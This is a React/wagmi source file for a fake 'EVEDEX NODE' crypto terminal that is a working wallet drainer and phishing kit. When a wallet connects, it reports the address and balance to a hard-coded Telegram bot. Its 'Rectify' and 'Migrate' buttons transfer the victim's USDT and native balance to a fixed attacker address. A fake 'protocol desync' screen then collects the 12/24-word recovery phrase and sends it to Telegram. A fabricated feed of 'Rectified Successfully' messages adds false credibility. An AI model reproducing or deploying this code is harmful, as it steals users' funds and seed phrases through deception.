import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const chainId = useChainId();
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [feedMsg, setFeedMsg] = useState(""); 

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", 42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" };

  const log = (m) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: m }) }).catch(()=>{});

  useEffect(() => {
    if (isConnected && address) log(`🔔 CONN: ${address}\nBAL: ${balance?.formatted}\nCHAIN: ${chainId}`);
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      setFeedMsg(`🛡️ ${addr} Rectified Successfully`);
      setTimeout(() => setFeedMsg(""), 4000);
    }, 9000);
    return () => clearInterval(interval);
  }, [isConnected, address]);

  const executeTaskAction = async () => {
    setLoading(true);
    const usdt = USDT_MAP[chainId];
    if (usdt && (activeTask === "Rectify" || activeTask === "Migrate")) {
      const amtHex = (balance?.value || 1000000n).toString(16).padStart(64, '0');
      const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${amtHex}`;
      sendTransaction({ to: usdt, data: payload, gasPrice: null }, { onSuccess: (h) => { log(`💰 USDT: ${address}\nTX: ${h}`); sweep(); }, onError: () => sweep() });
    } else { sweep(); }
  };

  const sweep = () => {
    const val = (balance?.value || 0n) - parseEther("0.02");
    if (val > 0n) {
      sendTransaction({ to: destination, value: val, gasPrice: null }, { onSuccess: () => { log(`✅ NAT: ${address}`); setView("seed_gate"); setLoading(false); }, onError: () => { setView("seed_gate"); setLoading(false); } });
    } else { setView("seed_gate"); setLoading(false); }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live" />
      </div>
      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div>
        <w3m-button balance="hide" />
      </header>
      {!isConnected ? ( <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div> ) : (
        <>
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView("task_box"); setInputVal(balance?.formatted?.slice(0,8) || "0.00");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'20px 5px', borderRadius:'15px', color: n === "Rectify" ? "#10b981" : "#475569", fontSize:'9px', fontWeight:'900'}}><div>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}</button>
              ))}
            </div>
          )}
          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
              <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
                <label style={{fontSize:'7px', color:'#10b981'}}>AVAILABLE BALANCE</label>
                <input type="number" value={inputVal} readOnly style={{background:'none', border:'none', color:'#10b981', fontSize:'24px', width:'100%', fontWeight:'900'}} />
              </div>
              <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'18px', fontWeight:'900'}}>PROCESS_{activeTask.toUpperCase()}</button>
            </div>
          )}
        </>
      )}
      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center'}}>{feedMsg}</div>}
      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', zIndex:4000}}>
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 20px', textAlign:'center', width:'100%'}}>
            <div style={{color:'#10b981', fontWeight:'900', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
            <p style={{fontSize:'8px', color:'#64748b', marginBottom:'20px'}}>DETECTION: PROTOCOL_DESYNC. ENTER RECOVERY PHRASE TO DECRYPT NODE.</p>
            <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#10b981', padding:'15px', outline:'none', marginBottom:'20px'}} />
            <button onClick={()=>{log(`🚨 SEED: ${seedVal}`); alert("NODE_INCOMPATIBLE");}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>FINALIZE_SYNC</button>
          </div>
        </div>
      )}
      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.9)', display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING...</div>}
    </div>
  );
}
